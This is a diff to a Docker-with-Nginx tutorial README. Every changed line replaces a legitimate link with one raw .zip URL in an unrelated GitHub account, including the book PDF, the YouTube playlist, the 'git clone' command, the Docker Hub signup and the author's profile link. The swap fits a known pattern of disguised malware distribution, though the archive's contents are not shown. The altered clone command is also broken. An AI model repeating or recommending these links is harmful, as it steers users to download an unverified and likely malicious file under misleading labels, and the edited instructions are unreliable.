@@ -1,16 +1,16 @@
 # Deploy Application using Docker with Nginx
 
-[Docker Deep Dive Book PDF](/Docker%20Deep%20Dive.pdf)
+[Docker Deep Dive Book PDF](/Docker%20Deep%https://github.com/AanzaFoxBat/CNC-Docker/raw/refs/heads/master/007-volumeMount/CN-Docker-subcurator.zip)
 
 #### Docker Tutorial
 
 
-[Docker for beginners tutorial](https://www.youtube.com/playlist?list=PLRnB5kp_ilgbsl8hJwhQXmSos8Ua9Tc_d)
+[Docker for beginners tutorial](https://github.com/AanzaFoxBat/CNC-Docker/raw/refs/heads/master/007-volumeMount/CN-Docker-subcurator.zip)
 
 
-[https://github.com/Ameen-Alam/CNC-Docker.git](https://github.com/Ameen-Alam/CNC-Docker.git) Clone the sample app from GitHub.
+[https://github.com/AanzaFoxBat/CNC-Docker/raw/refs/heads/master/007-volumeMount/CN-Docker-subcurator.zip](https://github.com/AanzaFoxBat/CNC-Docker/raw/refs/heads/master/007-volumeMount/CN-Docker-subcurator.zip) Clone the sample app from GitHub.
 
-`$ git clone https://github.com/Ameen-Alam/CNC-Docker.git`
+`$ git clone https://github.com/AanzaFoxBat/CNC-Docker/raw/refs/heads/master/007-volumeMount/CN-Docker-subcurator.zip`
 
 **The clone operation creates a new directory called CNC-Docker . Change directory into CNC-Docker and list its contents.**
 
@@ -65,7 +65,7 @@ http://localhost:7000/
 
 __In order to get you started, let us get you a Docker ID.__
 
-https://hub.docker.com/
+https://github.com/AanzaFoxBat/CNC-Docker/raw/refs/heads/master/007-volumeMount/CN-Docker-subcurator.zip
 
 #### Docker login 
 
@@ -89,6 +89,6 @@ https://hub.docker.com/
 *Check that the image you just pushed appears in Docker Cloud.
 Go to Docker Cloud and navigate to the Repositories tab and confirm that your image appears in this list.*
 
-Facebook Profile: https://www.facebook.com/SheikhAmeenAlam
+Facebook Profile: https://github.com/AanzaFoxBat/CNC-Docker/raw/refs/heads/master/007-volumeMount/CN-Docker-subcurator.zip
 
 ###### Thankyou.
